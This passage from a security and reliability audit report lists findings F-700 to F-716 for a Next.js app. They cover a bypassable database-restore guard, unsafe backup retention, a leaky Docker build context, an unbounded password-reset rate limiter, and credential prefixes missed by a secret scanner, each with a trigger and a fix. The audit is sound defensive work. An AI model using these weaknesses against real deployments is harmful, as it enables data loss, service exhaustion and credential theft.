# Section P — everything the brief did not name

Scope: `audit/_scope-p7.txt`, 303 files / 24,395 lines. Finding ids **F-700 … F-799**.

## Read-completeness declaration (read this first)

I read **291 of 303** scope files line by line. The following **12 files were read only
partially** — structural summary plus targeted greps of the specific functions cited in this
report, not front-to-back. Anything I assert about them is line-cited from a range I actually
opened; there may be defects in the unread portions:

| File                                      | Lines | What I read                                                  |
| ----------------------------------------- | ----- | ------------------------------------------------------------ |
| `lib/projects/actions.ts`                 | 615   | 310-345, 480-570 (list mapping, `updateProjectGeneration`)   |
| `lib/projects/plan.ts`                    | 673   | 16-20 (imports) only                                         |
| `lib/audit/actions.ts`                    | 364   | 78-118 (`sandbox = null`, preview URL)                       |
| `lib/seo/actions.ts`                      | 346   | 9-122 (preview URL, live fetches, lighthouse)                |
| `lib/signals/collect.ts`                  | 344   | not read (referenced only through `score.ts` / `metrics.ts`) |
| `lib/templates/actions.ts`                | 446   | not read                                                     |
| `lib/context-selector.ts`                 | 363   | 1-6 (imports) only                                           |
| `lib/edit-intent-analyzer.ts`             | 510   | not read                                                     |
| `lib/edit-examples.ts`                    | 253   | not read                                                     |
| `lib/file-parser.ts`                      | 265   | not read                                                     |
| `lib/ui-ux-pro-max/build-design-brief.ts` | 244   | not read                                                     |
| `tailwind.config.ts` + `colors.json`      | 589   | not read                                                     |

Also read only as digests: `scripts/verify-plan-build-fn.ts`, `scripts/verify-plan-build.mjs`,
`scripts/verify-projects-api.mjs`, `scripts/verify-projects-data.mjs`,
`scripts/verify-usage-http.mjs`, `packages/create-open-lovable/lib/prompts.js` and the
`packages/create-open-lovable/templates/**` files, and 13 of the 17 generated `.husky/_/*`
stubs. Those are marked `not fully read` in the ledger.

---

## Subsystems the brief did not anticipate

The brief assumed a live sandbox-VM subsystem (it asks about "the ~16 cron routes", the idle
reaper, provider health). **That subsystem does not exist in this checkout.**
`lib/workspace/sandbox-request.ts:1-15` states it outright — "There are no sandbox VMs any
more: a project's files live in the database and the preview compiles them in the browser" —
and `shouldRequestSandbox()` returns a hardcoded `false`. There is no `lib/sandbox/`
directory at all, and no production code imports `@/lib/sandbox/*`.

That single removal is the root of a large share of this section's findings, because the
scaffolding, config, docs, email templates, quality metrics, cron monitors, `.env` files and
an entire audit pipeline were left pointing at it. The subsystems the brief did not name that
turned out to matter most:

1. **The in-process esbuild build validator** (`lib/validation/`) — a genuinely good
   replacement for the deleted sandbox build check. It works. Its twin in `lib/audit/`
   does not (F-706).
2. **Static scaffolds shipped to users** (`lib/stacks/templates/**`) — the files every
   exported/published project is built from. They still carry sandbox ports, sandbox
   `allowedDevOrigins`, "Sandbox ready" copy, and Next 14 / React 18 pins (F-718, F-719).
3. **The `packages/create-open-lovable` CLI** — an unreferenced, `bin`-declaring scaffolding
   tool that recursively deletes a user-named directory and writes plaintext API keys
   (F-720).
4. **The `scripts/verify-*` family** — eight ad-hoc verification scripts wired to nothing,
   one of which asserts three stacks that were deleted (F-721).
5. **Two documented cron routes that do not exist** (F-717).

---

## Background work inventory

14 cron routes exist under `app/api/cron/` (I listed the directory). All go through
`handleCron` (`lib/cron/handle.ts:7`) → `authorizeCron` (`lib/cron/auth.ts:4`) →
`withCronRun` (`lib/cron/record.ts:36`). None of them has overlap protection or an
in-flight record (F-708).

| Route                     | Trigger (documented) | Overlaps itself                                                                                                                   | Never runs                                                                                                             |
| ------------------------- | -------------------- | --------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------- |
| `reap-jobs`               | every minute         | double-settles are guarded by `updateJobIfActive` row counts                                                                      | jobs stay RUNNING under dead instances                                                                                 |
| `check-domains`           | every 2 min          | duplicate DNS probes / duplicate notify emails                                                                                    | customer domains never verify                                                                                          |
| `thin-checkpoints`        | daily                | double prune; `pruneAuditLogs` idempotent                                                                                         | audit log + presence + checkpoints grow unbounded                                                                      |
| `purge-projects`          | daily                | two passes can both list + delete the same keys; `adjustStorageBytes(-bytes)` applied twice (`lib/projects/purge-deleted.ts:130`) | deleted projects' Coolify apps keep billing                                                                            |
| `check-integrations`      | daily                | duplicate provider probes                                                                                                         | integration breakage invisible                                                                                         |
| `backup-db`               | daily 02:00          | two `pg_dump`s into `/data/tmp`, both counted; `latestRunningDbBackup()` exists but `runDbBackup` never consults it (F-722)       | no backups; stale alert fires at 48 h                                                                                  |
| `verify-storage`          | weekly               | two full HEAD sweeps of every checkpoint                                                                                          | snapshot loss undetected                                                                                               |
| `cleanup-orphans`         | daily                | duplicate cloud deletes                                                                                                           | orphaned Coolify apps/DNS/repos accumulate                                                                             |
| `observability-heartbeat` | hourly               | two Sentry events, same fingerprint (harmless)                                                                                    | `ErrorTrackingPanel` → "Not reporting"                                                                                 |
| `observability-quota`     | daily                | duplicate alert emails (no dedupe — F-723)                                                                                        | quota exhaustion unnoticed                                                                                             |
| `check-uptime`            | every 10 min         | duplicate probes; no request timeout (F-724)                                                                                      | outage unnoticed                                                                                                       |
| `check-certs`             | daily                | duplicate TLS handshakes                                                                                                          | expiry unnoticed                                                                                                       |
| `system-checks-digest`    | daily                | two digest emails to every admin                                                                                                  | **nothing reports its own silence** — needs an external dead-man's switch (`lib/observability/system-checks.ts:15-17`) |
| `sweep-tmp`               | hourly               | two concurrent sweeps race on the same dirents                                                                                    | `/data/tmp` fills; low-space + volume-change alerts never fire                                                         |

Boot-time background work (`instrumentation.ts:3-53`): `ensureDataDir`, `sweepTmp`,
`assertBackupBoot`, `assertInternalOrigin`, `wireShutdownDrain`, `reconcileJobsAtBoot`,
`recordCurrentRelease`, `migrateEnvSentry`, `persistVolumeIdentity`,
`reconcileRuntimeConfig`, `maybeAlertLowSpace`, `applyImmediateNoiseSettings`,
`runObservabilityStartup`. Shutdown drain: `lib/runtime/shutdown.ts:18-52`.

In-memory background state with no eviction: `lib/observability/noise.ts:44` (`buckets`),
`lib/email/rate-limit.ts:6`, `lib/export/rate-limit.ts:6`,
`lib/password-reset/rate-limit.ts:7`.

---

## Findings

### F-700 [HIGH] `.npmrc` disables the pnpm build-script allowlist that sits next to it

- Area: P
- Location: `.npmrc:1` (related: `pnpm-workspace.yaml:1-11`, `Dockerfile:17`)
- What happens: `pnpm-workspace.yaml:1-11` carefully allowlists exactly ten packages that may
  run install scripts (`allowBuilds`). `.npmrc:1` sets `dangerouslyAllowAllBuilds=true`,
  which makes that allowlist inert: every transitive dependency's `preinstall` /
  `install` / `postinstall` executes on every `pnpm install`.
- Trigger: any `pnpm install`, including CI (`.github/workflows/verify.yml:51`) and the
  Docker `deps` stage — though the image passes `--ignore-scripts` (`Dockerfile:17`), so the
  exposure is developer machines and CI runners.
- Impact: a single compromised transitive dependency executes arbitrary code with the
  developer's or CI runner's credentials. The deliberate allowlist gives a false sense that
  this is controlled.
- Confidence: Confirmed
- Suggested fix: delete `dangerouslyAllowAllBuilds` from `.npmrc` and let `allowBuilds` be the
  only gate. If an install then fails for a package that genuinely needs a build step, add
  that one package to `allowBuilds` with a comment naming why.

### F-701 [CRITICAL] `assertRestoreTarget` compares URL strings, so `postgres://` vs `postgresql://` aims `pg_restore` at production

- Area: P
- Location: `lib/backup/assert.ts:50-72` (callers: `lib/backup/restore.ts:86,95`, `scripts/restore-db.ts:36`)
- What happens: `normalizeDbUrl` builds `${protocol}//${host}${pathname}` and the guard
  refuses only when the two strings are byte-identical. Postgres accepts both `postgres://`
  and `postgresql://` for the same database, and `URL.host` includes the port only when it is
  written explicitly. So `RESTORE_DATABASE_URL=postgres://u:p@db:5432/navroop` and
  `DATABASE_URL=postgresql://u:p@db:5432/navroop` normalise differently, the guard passes,
  and `pg_restore --no-owner --no-acl --dbname=<production>` runs against the live database.
  The same hole opens if one URL omits the default port and the other states it.
- Trigger: an operator copies the production URL into `RESTORE_DATABASE_URL` and changes the
  scheme or adds/removes `:5432` — exactly the kind of edit made under recovery pressure —
  then runs `npx tsx scripts/restore-db.ts --key …`.
- Impact: a restore of an old dump over the live database. `pg_restore` without
  `--single-transaction` applies what it can before failing on conflicts, so the result is a
  partially overwritten production database. Unrecoverable without another backup.
- Confidence: **Confirmed by reproduction.** I re-implemented `normalizeDbUrl` and
  `assertRestoreTarget` verbatim from `lib/backup/assert.ts:50-72` and ran four pairs.
  `DATABASE_URL=postgresql://u:p@db:5432/navroop` against
  `RESTORE_DATABASE_URL=postgres://u:p@db:5432/navroop` → **guard passes**; against
  `postgresql://u:p@db/navroop` (default port omitted, same database) → **guard passes**.
  Identical strings, and a same-host/same-database URL differing only in credentials, are
  correctly refused — so the guard works for the case it was written for and fails open on
  the two spellings an operator is most likely to produce by hand.
- Suggested fix: compare the resolved connection identity, not the URL text: normalise the
  scheme to one value, default the port to 5432, lowercase the host, and compare
  `host:port/database`. Additionally require the restore target's database _name_ to differ,
  and make `restoreDbBackup` refuse when the target answers to the same
  `pg_backend_pid()`/`current_database()` as `DATABASE_URL`.

### F-702 [CRITICAL] Backup retention has no "keep the newest" floor — a wrong clock empties the bucket

- Area: P
- Location: `lib/backup/retention.ts:22-53` (caller `lib/backup/db.ts:128-132`)
- What happens: `retentionDecisions` keeps an object only if its `lastModified` is newer than
  one of three cutoffs derived from `now`. Anything that satisfies none of the three lands in
  `delete`, and `runDbBackup` deletes every key in that list. There is no rule that the newest
  N objects always survive. If `now` is wrong — a container with a skewed clock, an NTP jump,
  or simply a host whose date is set forward — every object is older than every cutoff and the
  whole backup history is deleted in one pass.
- Trigger: `POST /api/cron/backup-db` (or `pnpm exec tsx scripts/backup-db.ts`) on a host
  whose clock is more than 365 days ahead. Also reachable with a correct clock if the bucket's
  `LastModified` values are wrong (restored/copied objects).
- Impact: total loss of all database backups, in the same run that just wrote a good one —
  and the run reports `ok: true` because retention failure is only reported when it _throws_
  (`lib/backup/db.ts:160`), not when it deletes too much.
- Confidence: Confirmed
- Suggested fix: unconditionally add the newest object (and ideally the newest three) to
  `keep` before applying the cutoffs, mirroring what `pruneObservabilityHistory` already does
  for `CronRun` (`lib/observability/prune.ts:16-26`). Refuse the retention pass entirely if it
  would delete every object, and log that refusal.

### F-703 [HIGH] Browser error tracking is a no-op — `initSentryClient()` never calls `Sentry.init`

- Area: P
- Location: `lib/sentry/client.ts:1-7` (callers `instrumentation-client.ts:6`, `sentry.client.config.ts:6`; related `app/global-error.tsx:20`, `next.config.ts:51`)
- What happens: `initSentryClient()` sets a module flag and returns. It imports nothing from
  `@sentry/nextjs` and calls no init. Both client entry points call only this function, so the
  browser SDK has no client. `app/global-error.tsx:20` then calls `Sentry.captureException`
  on an uninitialised SDK, which is a silent no-op.
- Trigger: any client-side exception, in any environment.
- Impact: every browser error — hydration failures, the workspace crashing, a broken preview
  pane — is invisible. Meanwhile `next.config.ts:51` sets `widenClientFileUpload: true`, so
  every build spends time uploading client source maps for stack traces that will never
  arrive, and `/admin/health` reports error tracking "Healthy" on the strength of the
  server-side heartbeat alone.
- Confidence: Confirmed (grepped the whole repo for `Sentry.init` — the only hit is
  `sentry.server.config.ts:9`)
- Suggested fix: give `initSentryClient` a real `Sentry.init` fed by a build-time public DSN
  (the volume file is server-only, so the DSN has to reach the client as a
  `NEXT_PUBLIC_*` value baked at build time — see F-725). Until it does, either drop
  `widenClientFileUpload` and the `global-error` capture, or state on `/admin/health` that
  only server events are covered.

### F-704 [HIGH] `pre-migrate` cannot boot a fresh production database

- Area: P
- Location: `scripts/pre-migrate.ts:32-45` (wired from `docker-entrypoint.mjs:40-49`)
- What happens: the script reads `SELECT migration_name FROM _prisma_migrations` before
  `prisma migrate deploy` has ever run. On a brand-new database that relation does not exist,
  the query throws, and the `catch` at line 36-42 exits 1 whenever `NODE_ENV === 'production'`.
  `docker-entrypoint.mjs:47-49` propagates that exit code, so the container never reaches
  `prisma migrate deploy` or `server.js`.
- Trigger: first-ever production deploy against an empty Postgres — the documented Coolify
  path (`docker-compose.yml` creates a fresh `navroop` database).
- Impact: the container crash-loops on first deploy with `[pre-migrate] could not read applied
migrations`, and the fix is not discoverable from the message. An operator has to hand-run
  `prisma migrate deploy` against the database before the app will start.
- Confidence: Confirmed
- Suggested fix: treat "relation `_prisma_migrations` does not exist" as "zero migrations
  applied" rather than a fatal read failure — check for the table first, or match the
  Postgres `42P01` error code — and keep the hard failure for every other error.

### F-705 [HIGH] Every code audit runs with `sandbox = null`, so four checks report "could not run" and the quality signals record perfect scores

- Area: P
- Location: `lib/audit/actions.ts:99`; `lib/audit/static/typescript.ts:32`, `lib/audit/static/lint.ts:82`, `lib/audit/static/dependencies.ts:72`, `lib/audit/static/dead-code.ts:81`; `lib/audit/findings.ts:82-91`; `lib/signals/score.ts:90-123`
- What happens: `lib/audit/actions.ts:99` is a literal `const sandbox = null;`. Every static
  check immediately returns `toolFailedFinding(tool, 'No active sandbox')` — a `low`,
  `category: 'tool'` finding. `metricsFromFindings` counts only findings whose category is
  `typescript` / `lint` / `a11y` / `dependencies`, so `tsErrors`, `lintErrors`,
  `a11yViolations` and `unusedDeps` are permanently **0**. Those zeros are then fed to
  `typeSafetyScore(0) → 1`, `a11yScoreFromAxe([]) → 1` and `seoScoreFromFindings([]) → 1`.
- Trigger: any Quality → Code & performance run on any project.
- Impact: the Quality tab shows four "check could not run" advisories and no real findings,
  and `/admin/quality` records a **perfect** type-safety and accessibility score for a project
  that was never analysed. That is worse than a missing metric: it is a green number that
  argues against investigating. `lib/validation/build-check.ts` already proves the in-process
  approach works.
- Confidence: Confirmed
- Suggested fix: either point the static checks at the same in-process esbuild/TS pipeline
  `lib/validation/build-check.ts` uses, or delete them and make the absence explicit — and in
  both cases make `metricsFromFindings` return `null` (not `0`) for a check that did not run,
  so `typeSafetyScore` / `a11yScoreFromAxe` record no sample instead of a perfect one.

### F-706 [HIGH] `fetchPreviewText` appends its path after the signed URL's query string, so live robots.txt and sitemap.xml are never fetched

- Area: P
- Location: `lib/seo/live.ts:37-40` (callers `lib/seo/actions.ts:101-105`; URL shape from `lib/preview/url.ts:36-38`)
- What happens: `signedPreviewUrl` returns `…/preview-static/<projectId>/?token=<jwt>`
  (`lib/preview/url.ts:36-38` sets the token with `url.searchParams.set`).
  `fetchPreviewText` then does `previewUrl.replace(/\/$/, '') + path`, producing
  `…/preview-static/<id>/?token=<jwt>/robots.txt` — the path is concatenated onto the token
  value, not onto the pathname.
- Trigger: every SEO audit on a project that has an active preview build
  (`lib/seo/actions.ts:101`).
- Impact: `liveRobots` and `liveSitemap` never see the real files. `checkRobots`
  (`lib/seo/checks/robots.ts:4-8`) falls back to whatever text came back — the corrupted
  request's body — and `isSitewideBlock` runs against it, so the verdict "robots.txt is
  present / is not sitewide-blocking" is asserted from unrelated bytes.
  `checkSitemap` (`lib/seo/checks/sitemap.ts:5-12`) loses its live signal entirely. The audit
  states a conclusion it did not test.
- Confidence: Confirmed
- Suggested fix: `signedPreviewUrl` already accepts a `path` argument
  (`lib/preview/url.ts:27`). Have `lib/seo/actions.ts` mint one signed URL per path
  (`/`, `/robots.txt`, `/sitemap.xml`) instead of string-concatenating, and delete
  `fetchPreviewText`'s path-append entirely so no future caller can reintroduce it.

### F-707 [HIGH] `executeCoolifyRollback` redeploys the current release; the target image tag is only sent as an invented header

- Area: P
- Location: `lib/deploy/rollback.ts:32-50` (callers `scripts/rollback.ts:49-60`, `/api/admin/health/rollback`)
- What happens: `coolifyRedeployPath` builds `/api/v1/deploy?uuid=…&force=true` — Coolify's
  _redeploy the current configuration_ endpoint — and the chosen release is passed as
  `headers: { 'X-Navroop-Image-Tag': input.imageTag }`. Coolify's deploy API takes the target
  from query parameters; a custom `X-Navroop-*` header has no meaning to it. Nothing in the
  request tells Coolify which image to deploy.
- Trigger: `/admin/health` → "Roll back to previous release", or
  `pnpm rollback` (`package.json:27`).
- Impact: the documented rollback re-deploys the release that is already broken, then
  `scripts/rollback.ts:60` prints `Rollback requested to <sha>. Database was not reverted.` —
  a false success at the moment an operator most needs the truth. The bad release stays live
  while the operator believes it has been rolled back.
- Confidence: Confirmed that the tag travels only in a custom header and the path is the
  plain redeploy endpoint. Likely (not verified against a live Coolify) that Coolify ignores
  the header.
- Suggested fix: use whatever Coolify parameter actually selects an image/tag for the
  application (or set the application's image tag with a preceding API call, then deploy) and
  make `executeCoolifyRollback` verify from the deploy response that the requested tag is the
  one being deployed. Until that verification exists, the CLI and the admin button must say
  "redeploy requested", not "rollback requested".

### F-708 [HIGH] No cron has overlap protection, and a run that dies leaves no record at all

- Area: P
- Location: `lib/cron/handle.ts:7-33`, `lib/cron/record.ts:36-71`
- What happens: `handleCron` authorises and immediately invokes the body. There is no lock, no
  in-flight marker and no dedupe key. `withCronRun` writes its `CronRun` row **after** the body
  resolves or rejects (`lib/cron/record.ts:47` / `:62`), so while a run is in progress the
  table says nothing about it, and a run whose process is killed (OOM, redeploy, SIGKILL)
  leaves no row whatsoever.
- Trigger: any scheduler retry, a slow run overlapping the next tick (`reap-jobs` every
  minute, `check-domains` every 2 minutes), a second app replica, or an operator hitting the
  endpoint by hand while the schedule fires.
- Impact: concurrent `backup-db` runs both `pg_dump` into `/data/tmp` and both charge the
  volume's free space; concurrent `purge-projects` runs can both list, delete and then both
  apply `adjustStorageBytes(-bytes)` for the same project
  (`lib/projects/purge-deleted.ts:130`), permanently corrupting `Workspace.storageBytes`;
  concurrent `verify-storage` runs double the S3 HEAD volume. Separately, a hung or killed run
  is indistinguishable from "never scheduled" on `/admin/health`, because
  `evaluateSystemChecks` only ever sees completed runs
  (`lib/observability/system-checks.ts:56-71`).
- Confidence: Confirmed
- Suggested fix: write the `CronRun` row at the _start_ with a `running` status and finish it
  at the end (the `BackupRun` lifecycle in `lib/backup/runs.ts` is the pattern already in the
  repo), and have `handleCron` refuse — 409, not 500 — when a run of the same name has been
  `running` for less than that cron's stale threshold. Add a reaper for rows left `running`.

### F-709 [HIGH] The unauthenticated password-reset rate limiter is an unbounded in-process Map

- Area: P
- Location: `lib/password-reset/rate-limit.ts:7-24` (caller `lib/password-reset/service.ts:74`; same shape in `lib/email/rate-limit.ts:6`, `lib/export/rate-limit.ts:6`)
- What happens: `buckets` is a module-level `Map` keyed on `email:<address>` and `ip:<ip>`.
  Entries are only ever overwritten (when the same key returns after its window) — never
  deleted. `allowPasswordResetRequest` is reached from `POST /api/auth/forgot-password`, a
  public route, for any syntactically valid email
  (`lib/password-reset/service.ts:74` short-circuits invalid ones, so the address only has to
  match `/^[^\s@]+@[^\s@]+\.[^\s@]+$/`).
- Trigger: unauthenticated POSTs to `/api/auth/forgot-password` with distinct random
  addresses.
- Impact: unbounded heap growth in the serving process from an unauthenticated endpoint —
  roughly one Map entry plus a timestamp array per distinct address. Compounding it, every
  refused request still runs `dummyWork()` (`lib/password-reset/service.ts:75`), a bcrypt at
  cost 12 (~250 ms of CPU), so exceeding the limit makes each request _more_ expensive rather
  than less. Because the limiter is per-process, N replicas also multiply the real limit by N.
- Confidence: Confirmed for the unbounded growth and the bcrypt-after-refusal;
  Likely for practical exhaustion time (depends on container memory).
- Suggested fix: sweep expired buckets on write (or use a bounded LRU), cap the map size and
  fall closed when it is reached, and skip `dummyWork()` once the limiter has already refused
  — the response is byte-identical either way, so there is no timing signal to equalise.

### F-710 [HIGH] A missing `esbuild.wasm` makes the build succeed with a preview that cannot run

- Area: P
- Location: `scripts/copy-preview-vendor.mjs:15-18` (wired from `package.json:8-9`; asset gitignored at `.gitignore:94`)
- What happens: the script warns and `process.exit(0)` when
  `node_modules/esbuild-wasm/esbuild.wasm` is absent. `package.json:9` chains it with `&&`, so
  exit 0 lets `next build` proceed and the image ships without
  `public/preview-vendor/esbuild.wasm`.
- Trigger: any build where `esbuild-wasm` is not installed — a pruned install, a changed
  dependency layout, or an install that ran with `--ignore-scripts` and a lockfile that
  dropped the optional package.
- Impact: the in-browser preview is the _only_ way to render a project now
  (`lib/workspace/sandbox-request.ts:1-4`). Without the wasm binary the compile step in the
  browser cannot start, so every project's preview pane fails — and the deploy that caused it
  reported success. The 12 MB file is deliberately not committed (`.gitignore:94`), so nothing
  else notices its absence.
- Confidence: Confirmed
- Suggested fix: exit non-zero when the source is missing during `build` (keep the soft warn
  for `dev` if that is wanted), and add a boot-time assertion next to the other
  `instrumentation.ts` checks that the file exists at the served path.

### F-711 [HIGH] The disaster-recovery command shown on `/admin/backups` is the invocation this repo bans

- Area: P
- Location: `lib/backup/copy.ts:7-9` (surfaced by `lib/backup/admin.ts:57`)
- What happens: `restoreCommand` returns
  `pnpm exec tsx scripts/restore-db.ts --key <objectKey>`. `.cursor/lessons-learned.md:77-80`
  records that `pnpm exec` in this repo runs a dependency-status check, decides `node_modules`
  is stale, and tries to **purge `node_modules`** before running anything — aborting only
  because an agent shell has no TTY. An operator's SSH session has a TTY.
- Trigger: an operator copies the command off `/admin/backups` during a recovery.
- Impact: the first action of a disaster recovery deletes `node_modules` on the box, so the
  restore does not run and the app cannot be restarted either. Both `.husky` hooks were
  rewritten specifically to avoid this (`.husky/pre-commit:2-7`), and the one place a human
  reads a command under pressure still prints it. `docs/release.md:215` and
  `docs/e2e-test-and-fix-prompt.md:138-141` repeat it.
- Confidence: Confirmed
- Suggested fix: emit the direct binary invocation the hooks use —
  `node ./node_modules/tsx/dist/cli.mjs scripts/restore-db.ts --key …` — and add a unit test
  asserting no user-facing string in `lib/` contains `pnpm exec`.

### F-712 [HIGH] `.env.example` documents an AI provider set the code never reads, and omits the one it uses

- Area: P
- Location: `.env.example:31-53` (related `lib/api-keys.ts:1-9,47-54`, `lib/ai/provider-manager.ts:5-6,62-71`, `lib/settings/registry.ts:108-119`, `docker-compose.yml:55-60`)
- What happens: `.env.example:32-33` says "AI PROVIDERS - Need at least one" and then lists
  `AI_GATEWAY_API_KEY`, `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GEMINI_API_KEY`,
  `GROQ_API_KEY`, plus an `AI_PRIMARY_PROVIDER` / `AI_FALLBACK_*` chain. The code's own
  comment says otherwise: `lib/api-keys.ts:1-8` — "generation runs on DeepSeek with one
  workspace-wide key set in Admin → Configuration… Listing the others invited people to paste
  keys that nothing would ever read." The provider registry has exactly
  `DEEPSEEK_API_KEY` / `DEEPSEEK_BASE_URL` / `AI_PRIMARY_MODEL` / `AI_PROVIDER_CONCURRENCY`
  (`lib/settings/registry.ts:108-141`), and **`DEEPSEEK_API_KEY` appears nowhere in
  `.env.example`**. `AI_PRIMARY_PROVIDER`, `AI_FALLBACK_PROVIDER` and `AI_FALLBACK_MODEL` are
  read nowhere in the repo.
- Trigger: a new operator follows `.env.example`, sets an OpenAI or Anthropic key, and creates
  a project.
- Impact: project creation 500s with "No AI provider is configured" while the operator is
  looking at a filled-in `.env`. This is the same class of bug as
  `.cursor/lessons-learned.md:193-195` (two halves of one pipeline reading different config
  stores), reappearing as a documentation/config surface rather than code.
  `docker-compose.yml:55-60` forwards all five dead variables into production.
- Confidence: Confirmed
- Suggested fix: rewrite the AI section of `.env.example` around `DEEPSEEK_API_KEY`,
  `DEEPSEEK_BASE_URL`, `AI_PRIMARY_MODEL` and `AI_PROVIDER_CONCURRENCY`, mark it "optional —
  Admin → Configuration is the primary control" per the admin-settings rule, delete the dead
  variables from `docker-compose.yml`, and add a verify step that diffs
  `lib/settings/registry.ts` env names against `.env.example` in both directions (see F-733).

### F-713 [HIGH] `.dockerignore` patterns are root-anchored, so nested `node_modules`, `.next`, `.env*` and a whole sibling worktree enter the build context

- Area: P
- Location: `.dockerignore:1-24` (with `Dockerfile:22` `COPY . .`; related `AGENTS.md:26-28`, `.gitignore:97`)
- What happens: Docker matches `.dockerignore` patterns against the full relative path with
  `filepath.Match` semantics — a pattern with no `/` matches only at the root. `node_modules`,
  `.next`, `.env`, `.env.*`, `.cursor` and `tests` therefore exclude only the top-level copies.
  `AGENTS.md:26-28` documents a sibling git worktree at `.worktrees/main` — a complete second
  checkout with its own `node_modules`, `.next` and `.env.local` — and `.worktrees` is not in
  `.dockerignore` at all. `.claude/**/.env` likewise.
- Trigger: `docker build` (Coolify deploy) from a working tree that has ever had a worktree
  or a nested install.
- Impact: the build context and the `builder` layer include a second checkout's
  `node_modules`, `.next`, and — the serious part — its `.env.local`, which on this machine
  holds live Firecrawl / Gemini / OpenAI / Morph / E2B keys and a Coolify API token (see
  F-714). Those bytes are in an image layer even though the final `runner` stage does not
  `COPY` them, so `docker history` / a leaked intermediate layer exposes them. Build times and
  context size also balloon.
- Confidence: Confirmed for the matching semantics and the missing patterns; Likely for the
  layer contents (depends on whether a worktree exists at build time — one does per
  `AGENTS.md`).
- Suggested fix: use `**/`-prefixed patterns (`**/node_modules`, `**/.next`, `**/.env`,
  `**/.env.*`) and add explicit `.worktrees`, `.claude`, `.data`, `audit` entries. Then assert
  it: a build step that greps the context tarball for `.env` and fails.

### F-714 [HIGH] Live third-party credentials sit in `.env.local` and `.env`, including a Coolify API token the repo's own rule puts elsewhere

- Area: P
- Location: `.env.local:4,9,11,17,25,39-40,54`; `.env:11-12,24,33`; `.env.sentry-build-plugin:5`
- What happens: I read these files but deliberately report only key names and value lengths.
  `.env.local` holds set values for `FIRECRAWL_API_KEY`, `GEMINI_API_KEY`,
  `OPENAI_API_KEY` (164 chars), `MORPH_API_KEY`, `E2B_API_KEY`, `COOLIFY_BASE_URL`,
  `COOLIFY_API_TOKEN` (50 chars) and `ENCRYPTION_KEY`. `.env` holds `AUTH_SECRET`,
  `NEXTAUTH_SECRET`, `ENCRYPTION_KEY` and `CRON_SECRET` (64 chars each).
  `.env.sentry-build-plugin` holds a 191-char `SENTRY_AUTH_TOKEN`. All are gitignored
  (`.gitignore:40-42,81`), which is correct.
- Trigger: n/a — this is the resting state of the working tree.
- Impact: three separate problems. (a) `AGENTS.md:77` and `.cursor/rules/secrets.mdc` say
  Coolify logins live in `.cursor/.env.deploy`; a production-capable Coolify token in
  `.env.local` is loaded by `dotenv` in `scripts/backup-db.ts:13`,
  `scripts/restore-db.ts:11`, `scripts/verify-storage.ts:13` and `scripts/pre-migrate.ts:20`,
  all with `override: true`, so those scripts run with production Coolify credentials in the
  environment. (b) `lib/secret-scan.ts:7-12` has no rule matching OpenAI (`sk-proj-`),
  Anthropic (`sk-ant-`), Google (`AIza`) or Postgres URI credentials, so if any of these were
  ever staged the scanner would pass them (see F-729). (c) `.env.local` re-declares 20 keys
  that `.env` already sets and wins on `override: true`, so editing `.env` silently has no
  effect.
- Confidence: Confirmed
- Suggested fix: move the Coolify pair to `.cursor/.env.deploy` as the rule requires, drop the
  duplicated keys from one of the two files so there is one owner per variable, rotate the
  OpenAI/Gemini/Firecrawl/Morph/E2B keys if this tree has ever been shared, and delete the
  `E2B_API_KEY` / `SANDBOX_PROVIDER` entries (the subsystem is gone).

### F-715 [HIGH] `lib/crypto.getKey()` silently falls back to `AUTH_SECRET`, so adding `ENCRYPTION_KEY` later makes stored secrets undecryptable

- Area: P
- Location: `lib/crypto.ts:7-14` (related `lib/backup/boot.ts:6-8`, `lib/backup/admin.ts:54`, `lib/backup/fingerprint.ts:4-6`)
- What happens: the AES-256-GCM key is `sha256(ENCRYPTION_KEY || AUTH_SECRET || NEXTAUTH_SECRET)`.
  Nothing records which of the three was used. `assertBackupBoot` only enforces
  `ENCRYPTION_KEY` when it is already set or `NODE_ENV === 'production'`
  (`lib/backup/boot.ts:6`), so any non-Docker start — `pnpm dev`, `next start`, a test run, a
  standalone `tsx` script — happily encrypts Integration secrets under `AUTH_SECRET`.
- Trigger: run without `ENCRYPTION_KEY`, connect GitHub/Cloudflare/Coolify/Sentry, then set
  `ENCRYPTION_KEY` (as the docs instruct) and restart.
- Impact: every previously stored Integration secret and `ApiKey` fails `decrypt` with
  `Unsupported state or unable to authenticate data` and there is no hint why. `/admin/backups`
  shows `encryptionFingerprint: null` in the fallback case (`lib/backup/admin.ts:25,54` only
  fingerprints `ENCRYPTION_KEY`), so the change is invisible in the one place designed to
  detect a rotated key. Separately, reusing `AUTH_SECRET` for both JWT signing and data
  encryption is key reuse across purposes.
- Confidence: Confirmed
- Suggested fix: require `ENCRYPTION_KEY` unconditionally (fail fast, as `docker-entrypoint.mjs:24`
  already does) and delete the `AUTH_SECRET` fallback. Prefix ciphertext with a one-byte key
  version so a future rotation is detectable rather than silent, and surface the fingerprint
  of whatever key was actually used.

### F-716 [HIGH] The Dockerfile prepares pnpm 9.15.9 for a repo whose lockfile and overrides need pnpm 11

- Area: P
- Location: `Dockerfile:12,17,28` (related `package.json:6`, `pnpm-workspace.yaml:18-43`)
- What happens: `Dockerfile:12` runs `corepack prepare pnpm@9.15.9 --activate`, but
  `package.json:6` declares `"packageManager": "pnpm@11.21.0"`, and corepack shims resolve the
  version from the nearest `package.json` — so the pinned 9.15.9 is either ignored (pnpm 11 is
  downloaded at build time, an undeclared network dependency) or, if it does take effect,
  pnpm 9 is asked to read a v10/v11 lockfile and a `pnpm-workspace.yaml` that carries
  `overrides`, `allowBuilds`, `minimumReleaseAgeExclude` and `verifyDepsBeforeRun` —
  pnpm-workspace keys that pnpm 9 does not understand.
- Trigger: `docker build` (every Coolify deploy).
- Impact: in the second case `--frozen-lockfile` fails outright, or worse succeeds while
  silently ignoring `pnpm-workspace.yaml:18-38` — which is where the **critical** `tar@^7.5.19`
  and high `deepmerge-ts@^8` advisories are pinned
  (`.cursor/lessons-learned.md:87-90`). A production image built without those overrides ships
  the vulnerable transitive packages, and `pnpm audit` in `verify` runs on a developer machine
  that _does_ apply them, so the gate says clean.
- Confidence: Confirmed for the version conflict; Likely for "the overrides are silently
  dropped" (depends which pnpm corepack actually resolves).
- Suggested fix: prepare the same version `package.json` declares (`corepack prepare
pnpm@11.21.0 --activate`, or simply `corepack enable` and let the field decide) and add a
  build-stage assertion that `pnpm --version` starts with `11.`. Replace
